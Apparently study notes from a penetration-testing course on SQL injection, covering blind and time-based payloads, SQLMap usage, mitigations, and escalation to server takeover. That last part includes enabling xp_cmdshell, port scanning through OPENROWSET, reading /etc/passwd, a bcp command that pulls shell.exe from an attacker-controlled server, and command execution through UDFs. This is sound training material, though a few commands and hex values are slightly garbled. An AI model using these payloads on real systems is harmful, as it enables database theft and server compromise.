- [MySQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [PostgreSQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)

____________________________________________________
## 4.5. Exploiting Blind SQL Injection
**Blind SQLi exploitation** is an inference methodology you can to extract database schemas and data.

If the web application is not exploitable via in-band or error-based SQL injections, yet still vulnerable, you can rely on blind exploitation.

This **does not mean** that blind SQL injections are exploitable only if the web application **does not print errors on its output**
  It simply mans that when crafting a **Boolean based SQLi** payload, you want to transform a query in a True/False condition which reflects its state to the web application output.

In the following slides we will see an example of a blind SQLi, both on one application which prints errors on its outputs, and a different application which does not print errors.

#### 4.5.1. Exploitation Scenario
In this example, `id` is a vulnerable parameter. (see img-152)

We can guess the dynamic query structure:
  ```
  SELECT <fields> FROM <table> WHERE id='<id parameter>';
  ```

The query probably looks something like:
  ```
  SELECT filename, views from images WHERE id='<id parameter>';
  ```

Now, we can try to trigger an always true condition and see what happens.

We can use `' OR 'a'='a` and see that the application shows an image. (see img-154)

Let us test it with another always true condition: `' OR '1'='1`
The result is the same.

On the other hand, this is an always **false** condition: `' OR '1'='11`
It does not find anything in the database: there is **no image and no view counter**. So this is clearly an exploitable SQL injection. (see img-156)

Once penetration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions, like:
- Is the first letter of the username `a`?
- Does this database contain three tables?
- And so on...

By using this method, a penetration tester can freely query the database! Let us see an example.

#### 4.5.2. Detecting the Current User
Example:
  Let us see a way to find the current database user by using Boolean based blind SQL injections.

  We will use 2 MySQL functions: *user()* and *substring()*

  **user()** returns the name of the user currently using the database:
    ```
    mysql> select user();
    +----------------+
    | user()         |
    +----------------+
    | root@localhost |
    +----------------+
    1 row in set (0.00 sec)
    ```

  **substring()** returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.
    ```
    mysql> select substring('elearnsecurity', 2, 1);
    +-----------------------------------+
    | substring('elearnsecurity', 2, 1) |
    +-----------------------------------+
    | 1                                 |
    +-----------------------------------+
    1 row in set (0.00 sec)
    ```

  Functions can be used as arguments of other functions.
    ```
    mysql> select substring(user(), 1, 1);
    +-------------------------+
    | substring(user(), 1, 1) |
    +-------------------------+
    | r                       |
    +-------------------------+
    1 row in set (0.00 sec)
    ```

  Moreover, SQL allows you to test the output of a function in a True/False condition.
    ```
    mysql> select substring(user(), 1, 1) = 'r';
    +------------------------------+
    | substring(user(), 1, 1) = 'r'|
    +------------------------------+
    | 1                            |                   // True
    +------------------------------+
    1 row in set (0.00 sec)
    mysql> select substring(user(), 1, 1) = 'a';
    +------------------------------+
    | substring(user(), 1, 1) = 'a'|
    +------------------------------+
    | 0                            |                   // False
    +------------------------------+
    1 row in set (0.00 sec)
    ```

  By combining those features we can iterate over the letters of the username by using payloads such as:
  - `' or substr(user(), 1, 1) = 'a`
  - `' or substr(user(), 1, 1) = 'b`
  - `...`

  When we find the first letter, we can move to the second:
  - `' or substr(user(), 1, 1) = 'a`
  - `' or substr(user(), 1, 1) = 'b`
  - `...`

  We continue down this path until we know the entire username.
  Here you can see that the first letter of the database username of the web application is `s`. We infer this because we see an image and we know an image is shown only upon a **TRUE** condition (see img-165)

#### 4.5.3. Scripting Blind SQLi Data Dump
Submitting all the payloads needed to find a username by hand, is very impractical. Doing the same to extract the content of an entire database would be nearly impossible.

In the *SQLMap* chapter you will see how to automate the dumping phase.

Now we can see another example: a web application that does not print any error on its output.
The methodology used to exploit the SQLi is the same!

  This is the web application output for a *false* condition (`http://localhost/ecommerce.php?id=0 or 1=2`). (see img-168)

  And this is the output for a true condition (`http://localhost/ecommerce.php?id=0 or 1=1`). (see img-169)
    The string *Nokia* appears only when a correct guess is made (true condition).

  We want to understand what the output looks like when we have a correct guess.
  We will have to find text in the web page code that will **only** appear for the correct guess: this will let us tell a match from a mismatch.
    Example:
      If the value of a field is **Armando**, we will have to make 7 iterations through the whole charset (one per character in the string).
      We will have made a correct guess when the string *Nokia* will be met in the output.

  Since the main difference between Error-based/in-band and blind sql injections is the large numbers of request performed (and the time consumed as a sequence), our first objective is to narrow down the charset.

  The charset will be our iteration space, so the smaller it is, the sooner we will retrieve the correct value.
    Example:
      To retrieve the first letter of string containing **dbo**, we have to submit the following payloads to the web application:
        Output from the web app: **False**
        ```
        999 or SUBSTRING(username(),1,1) = 'a',--
        ```
        Output from the web app: **False**
        ```
        999 or SUBSTRING(username(),1,1) = 'b',--
        ```
        Output from the web app: **False**
        ```
        999 or SUBSTRING(username(),1,1) = 'c',--
        ```
        Output from the web app: **True**
        ```
        999 or SUBSTRING(username(),1,1) = 'd',--
        ```

        This tells us that the first letter of the username id **d**

#### 4.5.4. Optimized Blind SQL Injections
It is clear that you will hardly perform manual exploitation of Blind SQL injection vulnerabilities.

However, when building your own BSQLi shell scripts, you need to keep the process as fast as possible.

We will now see a simple technique to reduce the number of request by narrowing down the number of characters in the charset.       

One of the best optimizations you can do to your Blind SQL injection exploitation algorithm, is to reduce the number of iterations you have to do per character.

This means that you need to be able to understand if the character you are trying to guess is:
- [A-Z]
- [a-z]
- [0-9]

We will now review a technique discovered by SecForce.

Tests:
  The first test is to see if the conversion to upper case of the current character will yield a FALSE or TRUE condition:
    ```
    ASCII(UPPER(SUBSTRING((<query), <position>, 1)))= ASCII(SUBSTRING((<query), <position>, 1))
    ```
    Keep note of the TRUE or FALSE condition you find.
    The `ASCII()` SQL function returns the ASCII code of a character.
    The `UPPER()` function transform a character into uppercase.
    Finally we test if a character of a query is the same as its uppercase relative.
      Example:
        a **does not equals** A
        A **equals** A

  Then we test if the conversion to lower case of the current character will yield a FALSE or TRUE condition:
    ```
    ASCII(LOWER(SUBSTRING((<query), <position>, 1)))= ASCII(SUBSTRING((<query), <position>, 1))
    ```
    Keep note of the TRUE of FALSE condition you find.
    `Lower()` converts a character to lowercase.

  Now its time to evaluate the results:
  - If the first query returns **TRUE** and the second is **FALSE**, the character is **uppercase**: It will iterate through [A-Z] only
  - If the first query returns **FALSE** and the second is **TRUE**, the character is **lowercase**: It will iterate through [a-z] only
  - If **both queries are TRUE** our character is **either a number or a symbol**: We will iterate through [0-9] and symbols only

#### 4.5.5. Time Based Blind SQL Injection
Another Blind SQL Injection technique is called **Time-Based Blind SQL Injection**. Time is used to infer a TRUE condition from a FALSE condition.

The SQL syntax used:
  ```
  %SQL condition% waitfor delay '0:0:5'
  ```
  If the SQL condition is TRUE the DBMS will delay for 5 seconds.

Some examples of Time-Based SQL Injection:
- Check if we are `sa` (MS SQL Server)
  ```
  if (select user) = 'sa' waitfor delay '0:0:5'
  ```
- Guess a database value (MySQL)
  ```
  IF EXISTS (SELECT * FROM users WHERE username = 'armando') BENCHMARK(1000000,MD5(1))
  ```
  Benchmark will perform `MD5(1)` function 1000000 times if the IF clause yields TRUE (thus consuming time).
  You should be careful with the first argument of `BENCHMARK()`. It may seriously affect the server load.

In the following video you will see how to manually exploit a blind SQL injection. You will also see how to write some scripts to automate the exploitation.

____________________________________________________
## 4.6. SQLMap
After seeing how manual exploitation of a SQL injection works, it is time to see one of the best and most used tools in the field: **SQLMap**

We will first take a look at its basic features, then we will move on to advantaged setting.

As the official documentation says: "SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers"

With *SQLMap* you can both *detect* and *exploit* SQL injections.
We strongly recommend testing your injections by hand first and then move to the tool because if you go full automatic, the tool could choose an inefficient exploitation strategy or even crash the remote service!

The basic syntax is pretty simple:
  ```
  $ sqlmap -u <URL> -p <injection parameter> [options]
  ```
  *SQLMap* needs to know the vulnerable URL and the parameter to test for a SQLi. It could even go fully automatic, without providing any specific parameter to test.

#### 4.6.1. Basic Syntax
Example:
To exploit the **union-based in-based SQLi**  of one of our previous examples, the syntax would have been:
  ```
  $ sqlmap -u "http://victim.site/view.php?id=1141" -p id --technique=U
  ```
  This tells SQLMap to test the `id` parameter of GET request for `view.php`. Moreover it tells SQLMap to use a UNION based SQL injection technique.

If you have to exploit a POST parameter you have to use:
  ```
  $ sql -u <URL> --data=<POST string> -p parameter [options]
  ```
  You can write the POST string by yourself or copy it from a request intercepted with Burp Proxy.

Another way to use SQLMap is by saving a request intercepted with Burp Proxy to a file. (see img-196)
And then specifying it on the command line:
  ```
  $ sqlmap -r <request file> -p parameter [options]
  ```
  You can also copy the POST string from a request intercepted with Burp Proxy.

#### 4.6.2. Extracting the Database Banner
The very first step of most SQLi exploitations is grabbing the database banner. By using the `--banner` switch you can grab the database banner. This is extremely helpful both to test your injection and to have proof of the exploitability of the vulnerability to include in your report.
  ```
  $ sqlmap -u <target> --banner <other options>
  ```

#### 4.6.3. Information Gathering
Then you can move to a sort of **information gathering phase**.
  The first thing is to list the users of the database:
    ```
    $ sqlmap -u <target> --users <other options>
    ```
  Then check if the web application database user is a database administrator:
    ```
    $ sqlmap -u <target> --is-dba <other options>
    ```

#### 4.6.4. Extracting the Databases
The `--dbs` command lets you list all of the available databases:
  ```
  $ sqlmap -u <target> --dbs <other options>
  ```

#### 4.6.5. Extracting the Schema
After that you can choose a database by using the `-D` switch and lists its tables:
  ```
  $ sqlmap -u <target> -D <database> --tables <other options>
  ```

In the same manner you can choose one or more tables and list their columns:
  ```
  $ sqlmap -u <target> -D <database> -T <tables, comma separated list> --columns <other options>
  ```

Finally you can dump just the columns you need:
  ```
  $ sqlmap -u <target> -D <database> -T <tables> -C <columns list> --dump <other options>
  ```


#### 4.6.6. SQL Injection
In the following video, you will see how to identify SQL injection vectors.
You will see how to use Boolean logic injections to test vulnerable parameters and use SQLMap to perform basic SQLi exploitation.

(see vid-206)


#### 4.6.7. SQLMap
In the following video you will see how to configure and use *SQLMap* to automate your SQL injections! The video covers:
- Best practices and best workflow to perform SQLi exploitation with SQLMap
- Exploitation GET injections
- Exploitation POST injections
- Checking payloads used
- Configuring the right technique to use
- Using Burp Proxy and SQLMap

(see vid-207)

#### 4.6.8. SQLMap Advanced Usage
Not all web application and exploitation scenarios are the same. Because of that, *SQLMap* provides you with some useful command line switches that help fine tune the following:
- The DBMS you are attacking
- Injection point
- Payload aggressiveness
- Exploitation speed and load on the client's infrastructure

###### 4.6.8.1. Forcing the DBMS
Different DBMSs offer different features. This also implies that you have to exploit different commands and default configuration to perform a SQLi exploitation.

*SQLMap* is able to detect the DBMS behind a web application automatically. If it fails, you can specify the DBMS by hand:
  ```
  $ sqlmap --dbms=<DBMS> ...
  ```

The DBMSs you can specify are:
- MySQL
- Oracle
- PostgreSQL
- Microsoft SQL Server
- Microsoft Access
- SQLite
- Firebird
- Sybase
- SAP MaxDB
- DB2

Specifying the DBMS also helps to shorten the detection phase and its detectability.
Beware that specifying the wrong DBMS means sending useless payloads to thet target application.

###### 4.6.8.2. Fine-Tuning the Payloads
Web applications sometime change their output in a way that *SQLMap* cannot figure it out. This makes a blind exploitation impossible. To get around this, you can use the `--string` and `--not-string` command line switches:
- Append to `--string` a string which is always be present in **true** output pages
- Append to `--not-string` a string which is always be present in **false** output pages

Example:
  Using the `--string` command line switch in the previous cell phones selling site looks like this:
    ```
    $ sqlmap -u 'http://localhost/ecommerce.php?id=1' --string "nokia" <other switches>
    ```

Sometimes a SQLi payload is inserted in a structured POST parameter like a JSON or you need to insert some characters to make the query syntactically correct.

You can do that by using the `--prefix` and `--suffix` command line switches.

If injection payloads need to end with `'));` it looks like this:
  ```
  $ sqlmap -u 'http://localhost/ecommerce.php?id=1' --suffix "'));'" <other switches>
  ```

###### 4.6.8.3. Aggresiveness and Load
For sake of simplicity in our examples we always exploited GET parameters, but SQLi can be performed on any client-side input field.

By using the `--level` command line switch, *SQLMap* is able to test:
- The Cookie header - values 2
- The User-Agent and Referrer - headers 3
- The Host - header 5

By default (default 1) *SQLMap* tests GET and POST parameters, increasing to Level 2 makes it test Cookie headers and increasing it more makes it test other headers and increase the number of columns tested for in-band exploitation.

Please note that the use of **the -p switch bypasses the Level**
  This means that by **manually setting the parameter to test**, you can **perform more accurate, stealthy, and in-depth exploitation**

As we have seen in this module, SQL injections are very powerful. This means that they also have a lot of potential to destroy or create a denial of service attack on your client's infrastructure.
  Example:
    Permanently injecting some heavy time-based SQLis on a popular page on a web site can:
    - Make the page load extremely slow
    - Eat-up all the CPU resources available for that site

The `--risk` parameter lets you fine-tune how **dangerous** your injections can be. Use this parameter only when needed **after carefully studying the web application you are testing!**

Generally speaking, launching SQLMap with both a high level and risk and letting it automatically test for injection points is **very unprofessional and will probably generate issues to your client's infrastructure!**

There are three Risk levels. Increasing Risk means first enabling heavy time-based injections and then enable OR-based injections.
  |Risk|SQLMap Behavior                      |
  |----|-------------------------------------|
  | 1  |(Default) innocuous injections       |
  | 2  |Enables heavy time-based injections  |
  | 3  |Enables OR-based injections          |

  OR-based injections are enabled only on the highest Risk value because using them on UPDATE queries would update all the rows in a table.

SQLi injections can take a long time to dump the data needed in a pentest. This time can be reduced by using persistent connection to the target by using the `--keep-alive` command line switch.
  ```
  sqlmap -u <target> --keep-alive <other commands>
  ```

Once you found out how to exploit a SQLi, you can reduce the dumping phase time by using parallel threads. Use the `--threads` command line switch with an argument ranging from 1 to 10.
  Example:
  Using 7 threads to exploit a blind injection
    ```
    sqlmap -u <target> --technique=8 --threads 7 <other commands>
    ```

**Conclusions**
  SQL Injections are one of the most common attacks black hat hackers use: they can rapidly take control over data and get unauthorized access to the entire sever!

  As a penetration tester you have to find a way to exploit SQL injections without destroying your client's web application or causing a denial of service.

  As always in ethical hacking, knowledge is the key for success!

____________________________________________________
## 4.7. Mitigation Strategies
SQLi vulnerabilities are **input validation vulnerabilities** and can be prevented by enforcing input validation on any user-controlled parameter.

In the following slides, you will see some mitigation strategies you can propose to a client in your report.

#### 4.7.1. Prepared Statements
Web applications which use SQL, can separate the code from instructions using bind variable in SQL. This is the best solution to mitigate SQL Injection and should always be favored over any other solution.

Implementing prepared statements could be a long term objective as it implies code refactoring of nearly every SQL interaction in the web application.
  Example:
    This is what a prepared statement in PHP looks like:
      ```
      $sql = "INSERT INTO test_table VALUES (?, ?, ?, ?)"; // No user-controlled input in the query
      $sql_statement = $mysqli->prepare($sql);
      $sql_statement->bind_param('dsss', $user_id, $name, $address, $email); // Tells the library which variable goes to which part of the query
      $user_id = $_POST['user_id'];
      $name = $_POST['name'];
      $address = $_POST['address'];
      $email =  $_POST['email'];
      $sql_statement->execute(); // Executes the query
      ```

#### 4.7.2. Type Casting
A short term method to prevent some SQLi is to perform type casting for some data types, perhaps most notably interger numbers:
  Example:
    ```
    $user_id = (int) $user_id;
    ```

#### 4.7.3. Type Casting
Input validation is a great short term solution and a good practice to put into production on top of prepared statements.

It can sometimes protect your application if a SQL injection vulnerability is somehow introduced by accident.

Example:
  This a white-list based validation example written in PHP.
  Only letters, spaces, and dashes are allowed:
    ```
    if (!preg_match(|'^[a-z\s-]$|i'), $name) {
      die('Please enter a valid name');
    }
    ```
____________________________________________________
## 4.8. From SQLi to Server Takeover
In this section, you will see who to use some advanced features provided by MS SQL Server and MySQL. These features can be exploited to **gain access to the DBMS server machine**.

#### 4.8.1. Advanced SQL Server Exploitation
SQL Server is a very powerful DBMS, providing advanced features to database administrators. Most of these features are privileged commands.

Users like **dbo** are not usually privileged enough to perform these commands.

From a penetration tester point of view, you can exploit these features to perform the advanced attacks that we will review in the next slides.

Since we will need high privileges, our first testing objectives is to retrieve the **sa** user's password.
Once we have the SHA-1 hash of the password, we can crack it and access the database in the same manner as a legitimate database administrator.

There are two queries you can run to retrieve the username and the password hash:
  ```
  SELECT name, password FROM master..sysxlogins
  ```
  ```
  SELECT name, password_hash FROM master.sys.sql_logins
  ```

###### 4.8.1.1. xp_cmdshell
The **sa** user has complete control over the DBMS, the databases it contains and... The **advanced features!**

Most of the functionalities useful for a penetration tester exploit the **xp_cmdshell stored procedure**

You can use the following syntax to run any OS command:
  ```
  EXEC master..xp_cmdhshell '<command>'
  ```

  However, `xp_cmdshell` is **not enabled by default**.
  Moreover it **requires sa privileges**

  But, if the web application is connecting to the backend DB as the **sa user**, or we can somehow connect as **sa**, we can enable it!

To enable it, we have to issue the following commands:
  ```
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  ```

And we can disable it again after we are done with out tests:
  ```
  EXEC sp_configure 'xp_cmdshell', 0;
  EXEC sp_configure 'show advanced options', 0;
  RECONFIGURE;
  ```

###### 4.8.1.2. Internal Network Host Enumeration
By using `xp_cmdshell` we can launch some commands on the database server.
We can combine this with some other SQL Server features to mount a host enumeration utility via SQL injections.

Issuing a *ping* command is just a matter of running:
  ```
  EXEC master.dbo.xp_cmdshell 'ping <target IP address>'
  ```
Unfortunately, the query above does not show results to a penetration tester.

Anyway, we can use the **query execution time to infer the ping result**.
To do that, we have to **compare** the execution time of a ping command executed against a known live host and the execution time against the host we want to test. The database server is often your best choice for a known live server.

So we test it first and note the execution time. Then we try it with another host.

By default the MS `ping` utility sends four ICMP echo requests.
This means that pinging a live host takes about 5 to 8 second, while pinging a bogus IP addresses takes from 20 to 30 seconds.

By using an advanced SQL Server feature we can also implement a **simple port scanner**.

###### 4.8.1.3. Port Scanning
`OPENROWSET` is a SQL Server method you can use to access the tables of a remote server. It needs the IP address and the port to connect to. This can be exploited to create a port scanner.
  ```
  SELECT * FROM OPENROWSET('SQLOLEDB', 'uid=sas;pwd=something;Network=DBMSSOCN;Address=<target IP>,<target port>;timeout=<connection timeout in seconds>', 'select 1')--
  ```

  If the port is closed we will see an error similar to this:
    *SQL Server doe note exist or access denied*

  If the port is open we will see:
    *General network error. Check your network documentation*

  If errors are hidden and the port is closed the connection will timeout according to the *<connection timeout in seconds>* value.

###### 4.8.1.4. Reading the File System
Going on, you can also read the file system by launching the `dir` command:
  ```
  EXEC master..xp_cmdshell 'dir <target directory>'
  ```
  That will return the directory listing of `<target directory>`

  To read the result, we can save the output of the command on a web accessible folder:
    ```
    EXEC master..xp_cmdshell 'dir c:\ > C:\inetpub\wwwroot\site\dir.txt'--
    ```
  and then just browse to *dir.txt* at the URL: http://site.com/dir.txt

Or we can read a file on the server and then put its content into a table. Then we can extract the table via SQLi like any other table:
  ```
  CREATE TABLE filecontent(line varchar(8000));
  BULK INSERT filecontent FROM '<target file>';

  /* Remember to drop the table after extracting it:
  DROP TABLE filecontent;
  */
  ```

###### 4.8.1.5. Uploading Files
By using MSSQL advanced features, it is also possible to **upload a file** to the victim server.

Uploading a file involves 2 steps:
1. First, we have to insert the file into a table in a MS SQL database under our control
  ```
  CREATE TABLE HelperTable (file text)
  BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')
  ```

2. Then, we force the target DB server to retrieve it from our server:
  ```
  EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c -Craw -S<our server address> -I<out server username> -P<our server password>'
  ```
  The victim server will connect to our SQL server, read the exe file from the table and recreate it remotely.

###### 4.8.1.6. Storing Command Results into a Temporary Table
Now that you know everything about advanced exploitation of SQL Server, let's see a technique to save the results of these stored procedures in a temporary table.

Then we can read the results by using some data dumping techniques.

1. Creating a temporary table
  The first things we want to do is to create a temporary table to hold the stored procedure output:
    ```
    CREATE TABLE temptable (id int not null identity (1,1), output nvarchar(4096) null);--
    ```
    The `id` column will help us to access different command outputs while the `output` column will contain the actual command results.

2. Crafting the argument for `xp_cmdshell`
  As you will see in the next step, we need to covert the **command string** of the command we want to run into an ASCII representation.

  Let us say that we want to run `dir c:\`

  We have to convert every character to its HEX ASCII representation:
  - 64 is the HEX code for "d"
  - 69 is the HEX code for "i"
  - 72 is the HEX code for "r"
  - 20 is the HEX code for ""
  - 63 is the HEX code for "c"
  - 3a is the HEX code for ":"
  - 4c is the HEX code for "\\"

  And then insert a double zero after every character of the string.

  The result is: `0x640069007200200063003a005c00`

3. Executing `xp_cmdshell`
  Now we have to create a variable with the command string we have just created and then we pass it to `xp_cmdshell`
    ```
    declare @t nvarchar(4096) set @t=0x640069007200200063003a005c00 insert into temptable (output) EXEC master.dbo.xp_cmdshell @t;
    ```

4. Reading the Results
  To read the results you can use any of the data-dumping techniques we have seen.
  You can use any of the data-dumping techniques we have seen. You can use the `id` field of the `temptable` to choose which command result you want to retrieve.

5. Final Cleanup
  After performing your tests, you have to delete the temporary table:
    ```
    DROP TABLE temptable;
    ```

#### 4.8.2. Advanced MySQL Exploitation
**MySQL** is another DBMS which provides some advanced features. A penetration can exploit them to get full access to a target server.
Most of the features we are going to see in a minute, rely on the [FILE](https://dev.mysql.com/doc/refman/5.1/en/privileges-provided.html#priv_file) privilege that "gives you permission to read and write files on the server host"

The FILE privileges can be granted to any MySQL user, depending on the web application needs. Anyway, it is always granted to the MySQL **root** user on both \*nix systems and MS Windows.

This means that if an application connects to its database as **root**, exploiting a SQL injection will lead not only to data compromise, but also **full server takeover**.

###### 4.8.2.1. Reading the File System
It is possible to read files by using the **LOAD_FILE** function:
  ```
  SELECT LOAD_FILE('<text file path>');
  ```

To read a binary file you can use it together with the **HEX** function:
  ```
  SELECT HEX(LOAD_FILE('<text file path>'));
  ```

  By using this method, you can convert any binary file to a long hex string that you can use to steal any data from the server.

It is also possible to parse the content of a file and tell MySQL how to distinguish one record from another:
  Example:
    ```
    CREATE TABLE template(output lontext);

    LOAD DATA INFILE '/etc/psswd' INTO TABLE temptable FIELDS TERMINATED BY '\n' (output);
    ```

    The resulting table will look like this:
      ```
      +---------------------------------------+
      | output                                |
      +---------------------------------------+
      | root:x:0:0:root:/root:/bin/bash       |
      | daemon:x:1:1:daemon:/usr/sbin:/bin/sh |
      | bin:x:2:2:bin:/bin:/bin/sh            |
      | sys:x:2:2:sys:/dev:/bin/sh            |
      | ...                                   |
      +---------------------------------------+
      ```

###### 4.8.2.2. Uploading Files
By using **SELECT ... INTO DUMPFILE** statement you can write the results of a query to a file. This can be used to **download a huge query results** via the web application and to **upload penetration tester supplied data** to the server
  ```
  SELECT <fields> FROM <table> INTO DUMPFILE '<output file path>';
  ```

To upload a binary file, you have to find a way to insert its content into a table on the victim machine. Then you can dump the table content to a file on the server file system.

But how?
  You have to convert it into a hex-string.
How?
  By using MySQL !

Example:
  To upload `/bin/ls`, you have to create a file on your local machine and then load it into a table:
    ```
    mysql> SELECT HEX(LOAD_FILE('/bin/ls')) INTO DUMPFILE '/tmp/ls.dmp';
    Query OK, 1 row affected (0.00 sec)

    mysql> LOAD DATA INFILE '/tmp/ls.dmp' INTO TABLE mytable FIELDS TERMINATED BY 'sOmErandOM' LINES TERMINATED BY 'oTHerRnD' (data);
    Query OK, 1 row affected (0.01 sec)
    Records: 1  Deleted: 0  Skipped: 0  Warnings: 0
    ```

  You can test it by using INTO DUMPFILE to recreate the same file:
    ```
    mysql> SELECT UNHEX(data) FROM mytable INTO DUMPFILE '/tmp/ls.test';
    Query OK, 1 row affected (0.00 sec)
    ```

  And test it:
    ```
    # sha25666sum /tmp/ls.test /bin/ls
    1e87d9599ddea2a93f060b50a54066e8b756d752158e6147cbb99b06eb11d99   /tmp/ls.test
    1e87d9599ddea2a93f060b50a54066e8b756d752158e6147cbb99b06eb11d99   /bin/ls
    ```

If everything works as expected you can upload the file content to a table on the victim server.

You will need to split the DUMPFILE you created into chunks of 1024 bytes and then insert them into a table field.
  Example:
    First you have to perform an insert with the first chunk. Next, you have to update the field by adding the other chunks.
      ```
      INSERT INTO victimtable(field) VALUES(0x7F454C4602010100000...1B000);
      ...
      UPDATE victimtable SET field=CONCAT(data,0x12000000...4C030000120);
      ...
      UPDATE victimtable SET field=CONCAT(data,0x00000000...9030000);
      ...
      UPDATE ...
      ```

Finally you can write the file on the target system by executing:
  ```
  SELECT <victim field> FROM <victim table> WHERE <optional conditional> INTO DUMPFILE '<output path>';
  ```

###### 4.8.2.3. Executing Shell commands
Writing files is a great thing, but what about executing commands?
MySQL does not provide a function to run shell commands by default, but it provides [User Defined Functions](https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html) **(UDF)**.

By using UDFs it is possible to create two functions:
- `sys_eval(<command>)` which returns the **standard output** of the chosen command
- `sys_exec(<command>)` that returns the command **exit status**

To use those functions, you have to upload a shared object (SO) on a \*nix system or a dynamic-link library (DLL) on a Windows system to the target server.

Then you can use them. You can find the source code of those functions [here](http://www.mysqludf.org/). Moreover you can find the compiled versions in the [SQLMap repository](https://github.com/sqlmapproject/sqlmap/tree/master/udf/mysql)

After uploading the files to the target system, running a command is just a matter of performing a SELECT:
  ```
  SELECT sys_eval('<command>')
  ```
  ```
  SELECT sys_exec('<command>')
  ```

This can be easily accomplished by using the SQLMap takeover features `--os-cmd` and `--os-shell`
